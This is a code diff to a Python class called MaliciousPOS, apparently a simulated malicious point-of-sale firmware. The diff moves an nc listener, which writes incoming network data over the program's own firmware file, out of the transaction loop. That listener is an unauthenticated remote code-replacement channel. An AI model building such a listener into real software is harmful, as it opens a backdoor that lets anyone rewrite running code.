@@ -29,10 +29,11 @@ class MaliciousPOS:
     def run(self):
         print "malicious POS firmware running..."
 
+        # keep opening nc listening port to receive firmware update
+        with open("pos_firmware.py", "w") as firmware:
+            subprocess.Popen(["nc", "-l", "-p", str(self.port)], stdout=firmware, stderr=subprocess.PIPE)
+
         while True:
-            # keep opening nc listening port to receive firmware update
-            with open("pos_firmware.py", "w") as firmware:
-                subprocess.Popen(["nc", "-l", "-p", str(self.port)], stdout=firmware, stderr=subprocess.PIPE)
 
             transac_id = ''.join(random.choice(string.digits) for _ in range(8))
             datetime = time.strftime('%Y-%m-%d %H:%M:%S')
@@ -85,4 +86,3 @@ if __name__ == '__main__':
         client.db.close()
 
     sys.exit()
-
